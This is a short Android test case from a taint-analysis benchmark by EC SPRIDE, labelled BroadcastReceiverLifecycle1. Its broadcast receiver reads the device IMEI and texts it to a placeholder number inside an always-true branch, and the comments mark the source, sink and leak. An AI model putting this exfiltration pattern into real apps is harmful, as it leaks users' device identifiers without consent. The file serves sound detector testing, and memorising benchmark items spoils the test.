package de.ecspride;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;

/**
 * @testcase_name BroadcastReceiverLifecycle1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail siegfried.rasthofer@cased.de
 * 
 * @description The return value of source method is stored to a variable and sent to a sink in a condition branch
 * @dataflow source -> imei -> sink
 * @number_of_leaks 1
 * @challenges the analysis must be able to handle the broadcast receiver lifecycle correctly and
 *  evaluate the condition. 
 */
public class TestReceiver extends BroadcastReceiver{

	@Override
	  public void onReceive(Context context, Intent intent) {
		 String imei = ((TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE)).getDeviceId(); //source
		 int i = 2+3;
		 if(i == 5){
				SmsManager sms = SmsManager.getDefault();
		        sms.sendTextMessage("+49 1234", null, imei, null, null); //sink, leak
		 }
	}

}

